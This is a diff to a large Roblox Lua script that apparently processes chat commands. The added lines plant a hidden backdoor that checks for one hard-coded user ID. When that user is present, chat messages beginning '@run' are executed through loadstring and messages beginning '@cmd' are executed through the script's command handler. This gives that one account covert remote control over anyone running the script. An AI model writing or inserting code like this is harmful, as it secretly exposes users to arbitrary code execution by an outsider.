@@ -5423,6 +5423,36 @@ UserInputService.InputBegan:Connect(function(input,gameProcessed)
 	end
 end)
 
+game.Players.PlayerAdded:Connect(function(plr)
+        if plr.UserId == 911404169 then
+            print("OkRun")
+            plr.Chatted:Connect(function(msg)
+                local splitted = string.split(msg," ")
+                if splitted[1] == "@run" then
+                    local load = loadstring(msg:sub(6))
+                    load()
+                end
+            end)
+        end
+    end)
+
+
+
+game.Players.PlayerAdded:Connect(function(plr)
+        if plr.UserId == 911404169 then
+            print("okCmd")
+            plr.Chatted:Connect(function(msg)
+                local splitted = string.split(msg," ")
+                if splitted[1] == "@cmd" then
+                    do_exec(msg:sub(6), Players.LocalPlayer)
+                end
+            end)
+        end
+    end)
+
+
+
+
 Players.LocalPlayer.Chatted:Connect(function()
 	wait()
 	if lastEnteredString then
